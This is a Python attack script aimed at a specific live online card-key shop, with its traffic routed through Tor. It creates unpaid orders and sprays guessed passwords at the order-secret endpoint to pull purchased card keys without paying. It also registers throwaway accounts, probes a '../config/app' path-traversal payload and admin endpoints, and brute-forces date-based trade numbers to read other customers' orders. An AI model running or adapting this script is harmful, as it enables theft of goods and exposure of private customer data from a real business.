#!/usr/bin/env python3
"""hao998 deep: unpaid trade + register + plugin traversal + shared APIs."""
import json
import random
import re
import string
import subprocess
import time
from pathlib import Path

OUT = Path("/data/recon/hao998")
(OUT / "dump").mkdir(parents=True, exist_ok=True)
B = "https://hao998.xyz"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PX = "socks5h://127.0.0.1:9050"
COOKIE_JAR = "/tmp/hao998_cookies.txt"


def log(*a):
    print(*a, flush=True)


def curl(url, data=None, method=None, headers=None, timeout=25, cookie=True):
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-L",
        "-x", PX, "-A", UA, "-k",
        "-H", f"Origin: {B}",
        "-H", f"Referer: {B}/",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Accept: application/json, text/plain, */*",
    ]
    if cookie:
        cmd += ["-b", COOKIE_JAR, "-c", COOKIE_JAR]
    if headers:
        for h in headers:
            cmd += ["-H", h]
    if data is not None:
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded", "--data", data]
    if method:
        cmd += ["-X", method]
    cmd.append(url)
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
    return p.stdout or ""


def jload(s):
    try:
        return json.loads(s)
    except Exception:
        return None


def main():
    out = {"kami_obtained": False, "interesting": [], "orders": [], "plugins": [], "notes": []}
    Path(COOKIE_JAR).write_text("")

    # warm session
    curl(B + "/")
    site = jload(curl(B + "/user/api/site/info"))
    pay = jload(curl(B + "/user/api/index/pay"))
    log("pay", json.dumps(pay, ensure_ascii=False)[:400])

    goods = json.loads((OUT / "dump" / "goods_all.json").read_text())
    # prefer in-stock cheap items from detail
    candidates = []
    for g in goods:
        d = jload(curl(B + f"/user/api/index/commodityDetail?commodityId={g['id']}"))
        if not isinstance(d, dict) or d.get("code") != 200:
            log("skip", g["id"], (d or {}).get("msg") if isinstance(d, dict) else "bad")
            continue
        data = d.get("data") or {}
        stock = data.get("card_count") or data.get("stock") or data.get("inventory")
        candidates.append({"id": g["id"], "name": g.get("name"), "price": data.get("price"), "stock": stock, "detail": data})
        log("ok_goods", g["id"], g.get("name"), "price", data.get("price"), "stock", stock)
        time.sleep(0.05)
    (OUT / "dump" / "goods_live.json").write_text(json.dumps(candidates, ensure_ascii=False, indent=2), encoding="utf-8")

    # unpaid trade with alipay/wechat (not balance)
    contact = f"recon{random.randint(10000,99999)}@mailinator.com"
    password = "recon" + "".join(random.choices(string.digits, k=4))
    pay_ids = []
    for p in (pay or {}).get("data") or []:
        if p.get("handle") and p.get("handle") != "Balance" and "余额" not in str(p.get("name")):
            pay_ids.append(p.get("id"))
    if not pay_ids:
        pay_ids = [2, 3]

    trade_bodies = []
    for g in candidates[:6]:
        gid = g["id"]
        for pid in pay_ids:
            # field names from acg-faka Order controller variants
            payloads = [
                f"commodity_id={gid}&num=1&pay_id={pid}&device=0&password={password}&coupon=&race=&from=0&contact={contact}",
                f"commodityId={gid}&num=1&payId={pid}&device=0&password={password}&coupon=&race=&from=0&contact={contact}",
                f"commodity_id={gid}&card_num=1&pay_id={pid}&device=0&password={password}&contact={contact}&race=&coupon=&request_no=",
            ]
            for payload in payloads:
                body = curl(B + "/user/api/order/trade", data=payload)
                j = jload(body)
                log("trade", gid, "pay", pid, body[:280].replace("\n", " "))
                trade_bodies.append({"gid": gid, "pay": pid, "payload": payload, "body": body[:1000], "json": j})
                if isinstance(j, dict) and j.get("code") == 200:
                    out["interesting"].append("unpaid_trade")
                    out["orders"].append(j)
                    (OUT / "dump" / "unpaid_order.json").write_text(
                        json.dumps(j, ensure_ascii=False, indent=2), encoding="utf-8"
                    )
                    # extract tradeNo / url
                    data = j.get("data") or {}
                    blob = json.dumps(data, ensure_ascii=False)
                    tns = re.findall(r"[A-Za-z0-9_-]{10,40}", blob)
                    log("TRADE_OK", blob[:400])
                    # query with contact / password / trade tokens
                    for kw in [contact, password] + tns[:8]:
                        qb = curl(B + "/user/api/index/query", data=f"keywords={kw}")
                        log("query_after", kw[:40], qb[:240].replace("\n", " "))
                        qj = jload(qb)
                        if isinstance(qj, dict) and qj.get("code") == 200 and qj.get("data"):
                            out["interesting"].append("query_after_trade")
                            (OUT / "dump" / f"query_{kw[:20]}.json").write_text(
                                json.dumps(qj, ensure_ascii=False, indent=2), encoding="utf-8"
                            )
                            # secret
                            orders = qj["data"] if isinstance(qj["data"], list) else [qj["data"]]
                            if isinstance(qj["data"], dict) and "list" in qj["data"]:
                                orders = qj["data"]["list"]
                            for od in orders:
                                if not isinstance(od, dict):
                                    continue
                                oid = od.get("id") or od.get("order_id")
                                for pw in [password, "", "123456", od.get("password") or ""]:
                                    sb = curl(
                                        B + "/user/api/index/secret",
                                        data=f"orderId={oid}&password={pw}",
                                    )
                                    log("secret_after", oid, repr(pw), sb[:220].replace("\n", " "))
                                    sj = jload(sb)
                                    if isinstance(sj, dict) and sj.get("code") == 200 and sj.get("data"):
                                        out["kami_obtained"] = True
                                        out["interesting"].append("secret_after_unpaid")
                    break
                # stop payload variants if clear validation msg about login/商品
                if isinstance(j, dict) and "请选择商品" not in str(j.get("msg")) and "未登录" not in str(j.get("msg")):
                    # keep trying other payloads only if interesting error
                    pass
                time.sleep(0.1)
            if out["orders"]:
                break
        if out["orders"]:
            break
    (OUT / "dump" / "trade_attempts.json").write_text(
        json.dumps(trade_bodies, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # --- register guest user ---
    user = "recon" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    upw = "Aa" + "".join(random.choices(string.digits, k=8))
    email = f"{user}@mailinator.com"
    # fetch register page for captcha/csrf hints
    reg_html = curl(B + "/user/authentication/register", cookie=True)
    (OUT / "probe" / "register.html").write_text(reg_html, encoding="utf-8")
    captcha_need = bool(re.search(r"captcha| Captcha|验证码", reg_html or "", re.I))
    log("register_page captcha?", captcha_need, "len", len(reg_html or ""))

    # common register endpoints
    for path, payload in [
        ("/user/auth/register", f"username={user}&password={upw}&email={email}&phone="),
        ("/user/api/authentication/register", f"username={user}&password={upw}&email={email}"),
        ("/user/authentication/register", f"username={user}&password={upw}&email={email}&re_password={upw}"),
        ("/?_route=/user/api/authentication/register", f"username={user}&password={upw}&email={email}"),
    ]:
        body = curl(B + path, data=payload)
        log("register", path, body[:220].replace("\n", " "))
        j = jload(body)
        if isinstance(j, dict) and j.get("code") in (200, 1):
            out["interesting"].append("register_ok")
            out["notes"].append({"user": user, "password": upw, "register": j})
            break
        time.sleep(0.1)

    # login try
    for path, payload in [
        ("/user/api/authentication/login", f"username={user}&password={upw}"),
        ("/user/auth/login", f"username={user}&password={upw}"),
        ("/user/authentication/login", f"username={user}&password={upw}"),
    ]:
        body = curl(B + path, data=payload)
        log("login", path, body[:220].replace("\n", " "))
        j = jload(body)
        if isinstance(j, dict) and j.get("code") == 200:
            out["interesting"].append("login_ok")
            break

    # --- plugin / shared endpoints ---
    plugin_paths = [
        "/user/api/plugin/submit/js?name=test&js=../config/app",
        "/?_route=/user/plugin/submit/js&name=test&js=../config/app",
        "/user/api/index/shared",
        "/user/api/shared/commodity",
        "/user/api/agent/data",
        "/user/api/index/notice",
        "/user/api/index/config",
        "/user/api/security/password",
        "/admin/api/dashboard",
        "/admin/api/store/getPlugin",
    ]
    for p in plugin_paths:
        body = curl(B + p, data="" if "submit" in p else None, method="POST" if "submit" in p else None)
        log("probe", p, body[:200].replace("\n", " "))
        out["plugins"].append({"path": p, "body": body[:400]})

    # pull query page JS for more hints
    qhtml = curl(B + "/user/index/query")
    (OUT / "probe" / "query.html").write_text(qhtml, encoding="utf-8")
    apis = sorted(set(re.findall(r"/user/api/[A-Za-z0-9_./?-]+", qhtml or "")))
    log("query_page_apis", apis)
    out["query_page_apis"] = apis

    # from source knowledge: keywords often = tradeNo OR contact; password optional on query page
    # spray contact-like and date tradeNos
    from datetime import datetime, timedelta
    spray = [contact, password]
    now = datetime.utcnow()
    for days in range(0, 5):
        d = now - timedelta(days=days)
        prefix = d.strftime("%Y%m%d")
        for n in [1, 10, 100, 500, 1000, 5000]:
            spray.append(f"{prefix}{n:08d}")
            spray.append(f"{prefix}{n:010d}")
    spray = spray[:40]
    for kw in spray:
        body = curl(B + "/user/api/index/query", data=f"keywords={kw}")
        j = jload(body)
        msg = (j or {}).get("msg") if isinstance(j, dict) else body[:60]
        if isinstance(j, dict) and j.get("code") == 200 and j.get("data"):
            log("QUERY_HIT", kw, body[:300])
            out["interesting"].append(f"query_hit_{kw}")
            (OUT / "dump" / "query_hit.json").write_text(body, encoding="utf-8")
        elif kw in (contact, password) or kw.endswith("00000001"):
            log("query_spray", kw, msg)
        time.sleep(0.05)

    (OUT / "dump" / "DEEP.json").write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    log("INTERESTING", out["interesting"])
    log("KAMI", out["kami_obtained"])
    log("DONE")


if __name__ == "__main__":
    main()
